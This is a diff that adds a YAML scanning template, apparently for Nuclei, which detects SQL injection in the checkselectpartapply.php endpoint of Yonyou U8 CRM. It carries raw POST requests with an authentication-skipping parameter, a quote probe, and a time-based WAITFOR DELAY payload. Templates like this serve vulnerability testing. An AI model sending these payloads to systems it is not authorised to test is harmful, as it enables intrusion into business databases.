@@ -1,0 +1,52 @@
+id: poc-yaml-yongyon-u8-crm-checkselectpartapply-php-sqli
+info:
+  name: 用友U8 CRM checkselectpartapply.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    用友U8 CRM checkselectpartapply.php SQL注入漏洞 allows attackers to perform SQL injection attacks.
+http:
+  - raw:
+      - |
+        POST /partrtn/checkselectpartapply.php?DontCheckLogin=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Content-Type: application/x-www-form-urlencoded
+
+        applyIDs=1'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"success\":false"
+        part: body
+
+  - raw:
+      - |
+        POST /partrtn/checkselectpartapply.php?DontCheckLogin=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Content-Type: application/x-www-form-urlencoded
+
+        applyIDs=1);WAITFOR+DELAY+'0:0:{{t1}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"success\":true"
+          - "fromObjID"
+        part: body
+      - type: dsl
+        dsl:
+          - duration > {{t1}}
+          - duration < {{t2}}
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 3}}'
